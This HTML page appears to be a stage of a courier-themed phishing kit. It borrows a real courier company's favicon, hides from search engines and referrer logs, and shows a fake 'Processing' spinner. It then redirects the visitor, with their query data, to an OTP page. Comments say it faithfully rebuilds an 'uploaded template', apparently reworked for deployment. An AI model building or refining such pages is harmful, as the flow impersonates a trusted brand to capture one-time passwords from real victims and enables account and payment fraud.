<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="referrer" content="no-referrer" />
    <meta name="robots" content="noindex,nofollow,noarchive,nosnippet" />
    <title>Buffalo Courier │ Worldwide Express</title>
    <link rel="icon" type="image/x-icon" href="https://thecourierguy.co.za/img/favicon.ico" />
    <link rel="shortcut icon" href="https://thecourierguy.co.za/img/favicon.ico" />
    <meta name="theme-color" content="#ffffff" />
    <style type="text/css">
        html, body {
            margin: 0;
            padding: 0;
            height: 100%;
            background: #ffffff;
        }
        body {
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .stack {
            text-align: center;
        }
        /* 12-bar spinner — visually identical to the uploaded template */
        .lds-spinner {
            color: official;
            display: inline-block;
            position: relative;
            width: 80px;
            height: 80px;
        }
        .lds-spinner div {
            transform-origin: 40px 40px;
            animation: lds-spinner 1.2s linear infinite;
        }
        .lds-spinner div:after {
            content: " ";
            display: block;
            position: absolute;
            top: 3px;
            left: 37px;
            width: 6px;
            height: 18px;
            border-radius: 20%;
            background: black;
        }
        .lds-spinner div:nth-child(1)  { transform: rotate(0deg);   animation-delay: -1.1s; }
        .lds-spinner div:nth-child(2)  { transform: rotate(30deg);  animation-delay: -1s;   }
        .lds-spinner div:nth-child(3)  { transform: rotate(60deg);  animation-delay: -0.9s; }
        .lds-spinner div:nth-child(4)  { transform: rotate(90deg);  animation-delay: -0.8s; }
        .lds-spinner div:nth-child(5)  { transform: rotate(120deg); animation-delay: -0.7s; }
        .lds-spinner div:nth-child(6)  { transform: rotate(150deg); animation-delay: -0.6s; }
        .lds-spinner div:nth-child(7)  { transform: rotate(180deg); animation-delay: -0.5s; }
        .lds-spinner div:nth-child(8)  { transform: rotate(210deg); animation-delay: -0.4s; }
        .lds-spinner div:nth-child(9)  { transform: rotate(240deg); animation-delay: -0.3s; }
        .lds-spinner div:nth-child(10) { transform: rotate(270deg); animation-delay: -0.2s; }
        .lds-spinner div:nth-child(11) { transform: rotate(300deg); animation-delay: -0.1s; }
        .lds-spinner div:nth-child(12) { transform: rotate(330deg); animation-delay:  0s;   }

        @keyframes lds-spinner {
            0%   { opacity: 1; }
            100% { opacity: 0; }
        }

        p.label {
            /* Ubuntu is requested by the original template; fall back gracefully
               so we don't need to load any external font (CSP would block it). */
            font-family: Ubuntu, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Cantarell, sans-serif;
            margin: 0;
            color: #000;
        }
    </style>
</head>
<body>
    <div class="stack" role="status" aria-live="polite" aria-busy="true">
        <div class="lds-spinner" aria-hidden="true">
            <div></div><div></div><div></div><div></div>
            <div></div><div></div><div></div><div></div>
            <div></div><div></div><div></div><div></div>
        </div>
        <br />
        <p class="label">Processing, Please Wait ...</p>
    </div>

    <script>
        // Mirrors the uploaded template's 29-second meta-refresh, but as a JS
        // redirect so the existing query-string (e.g. ?vehicle1=Bike) is
        // forwarded to the OTP step for session continuity.
        (function () {
            var DELAY_MS = 29000;
            setTimeout(function () {
                window.location.replace('/otp_1.html' + window.location.search);
            }, DELAY_MS);
        })();
    </script>
</body>
</html>
